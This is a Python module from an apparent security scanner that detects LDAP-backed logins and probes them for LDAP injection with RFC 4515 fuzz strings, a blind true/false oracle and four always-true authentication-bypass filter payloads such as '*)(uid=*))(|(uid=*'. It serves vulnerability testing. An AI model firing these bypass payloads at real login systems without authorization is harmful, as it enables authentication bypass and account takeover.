#!/usr/bin/env python3
"""ldap_injection_tester.py — RFC 4515 fuzz + blind true/false-oracle.

Confirmed gap: zero LDAP injection coverage anywhere in idor.py/authz_audit.py/
sast_audit.py. Only activates when a stack-fingerprint check suggests LDAP-backed
auth (AD/Java-enterprise/PHP-enterprise login), to avoid wasted cycles and false
positives on unrelated stacks. Detection is baseline-diff (against a captured
baseline response), not raw error-string matching — generic login pages error
for all kinds of unrelated reasons. The blind oracle requires a stable-FALSE
control plus a 3x-repeat before confirming, per the same anti-FP discipline
nomore403_audit.py already applies elsewhere in this codebase.
"""
from __future__ import annotations

from dataclasses import dataclass

_LDAP_STACK_MARKERS = {
    "active-directory", "adfs", "ldap-realm", "spring-security", "openldap",
    "samba-ad", "389-ds",
}

# friends full-tool review F8: tech-fingerprint names alone never carry the
# markers above, so the gate always skipped. These are the LDAP/AD signals a
# blackbox scan actually observes — enterprise SSO/ADFS/CAS login URL paths, and
# NTLM/Negotiate/Kerberos WWW-Authenticate challenges (the classic AD tell).
_LDAP_URL_PATTERNS = (
    "/adfs", "/sso", "/cas/login", "/cas/", "/simplesaml", "/openam", "/nidp",
    "/oam/", "/siteminder", "/ldap", "/openidm", "/nds",
)
_NTLM_AUTH_MARKERS = ("negotiate", "ntlm", "kerberos")


def looks_like_ldap_backed_auth(fingerprint_tags: set[str], urls=None,
                                www_authenticate=None) -> bool:
    """True when the target's auth is plausibly LDAP/AD-backed.

    Signals (any one suffices):
      - a tech tag in _LDAP_STACK_MARKERS;
      - an enterprise SSO/ADFS/CAS login URL path (F8 — the common blackbox tell);
      - an NTLM/Negotiate/Kerberos WWW-Authenticate challenge (AD-integrated auth).
    """
    if fingerprint_tags & _LDAP_STACK_MARKERS:
        return True
    if urls:
        blob = " ".join(str(u).lower() for u in urls)
        if any(p in blob for p in _LDAP_URL_PATTERNS):
            return True
    if www_authenticate:
        if isinstance(www_authenticate, (list, set, tuple)):
            vals = " ".join(str(v).lower() for v in www_authenticate)
        else:
            vals = str(www_authenticate).lower()
        if any(m in vals for m in _NTLM_AUTH_MARKERS):
            return True
    return False


def build_rfc4515_fuzz_payloads() -> list[str]:
    """RFC 4515 special characters that must be escaped in an LDAP filter;
    an unescaped occurrence reaching the filter is the injection signal."""
    return ["*", ")(", "(|(", "\\28", "\\29", "\\2a", "(&(", "*)(uid=*"]


def build_always_true_bypass_payloads(username_field: str) -> list[str]:
    """Always-true auth-bypass filter injections. All 4 have equal open/close
    paren COUNTS, but they assume two *different* embedding contexts, verified
    separately — this is not a single uniform "correctly nested" claim:

    - Payloads #1, #3, #4 assume a single-field filter template, e.g.
      ``(field=<payload>)``. Embedded there, nesting depth never goes negative
      (no mid-string unmatched closing paren).
    - Payload #2 (the classic ``*)(uid=*))(|(uid=*``) is the textbook
      username+password bind-filter bypass. It only nests validly inside a
      two-condition AND bind-filter template, e.g.
      ``(&(uid=<payload>)(userPassword=<pw>))`` — the realistic shape of an
      LDAP auth bind filter this payload actually targets. Embedded in a
      single-field template instead (``(uid=<payload>)``), it produces a
      mid-string unmatched closing paren (nesting depth goes to -1) — it is
      NOT validly nested in that context. Kept as-is (rather than rewritten)
      because this is the real-world attack shape; see payload comment below.
    """
    return [
        f"{username_field}*)(|({username_field}=*)",
        # Classic bind-filter bypass — assumes a two-condition AND template
        # like (&(uid=<payload>)(userPassword=...)), NOT a single-field
        # template. See docstring above: this payload's nesting only stays
        # non-negative when embedded that way.
        f"*)(uid=*))(|(uid=*",
        f"admin)(&(password=*)",
        f"*)(&(objectClass=*)",
    ]


@dataclass
class OracleResult:
    confirmed: bool
    detail: str = ""


def _looks_different_from(response, baseline) -> bool:
    return (response.status_code != baseline.status_code) or (response.text != baseline.text)


def run_blind_oracle(client, url: str, param: str, baseline_response) -> OracleResult:
    """3x-repeat: for each of 3 rounds, verify a stable-FALSE control query still
    matches the baseline AND a true-condition query diverges from it. Only
    confirms if ALL 3 rounds are consistent — a single anomalous round is not
    enough (matches every other blind-oracle module in this codebase)."""
    consistent_rounds = 0
    for _round in range(3):
        control_response = client.get(url, params={param: "nonexistent_user_control_probe"})
        if _looks_different_from(control_response, baseline_response):
            # control itself diverged — the oracle isn't stable, abort early
            return OracleResult(confirmed=False, detail="stable-FALSE control did not match baseline")

        true_response = client.get(url, params={param: "*)(uid=*"})
        if not _looks_different_from(true_response, baseline_response):
            return OracleResult(confirmed=False, detail=f"round {_round + 1}: true-condition query did not diverge from baseline")
        consistent_rounds += 1

    return OracleResult(confirmed=consistent_rounds == 3, detail=f"{consistent_rounds}/3 consistent rounds")
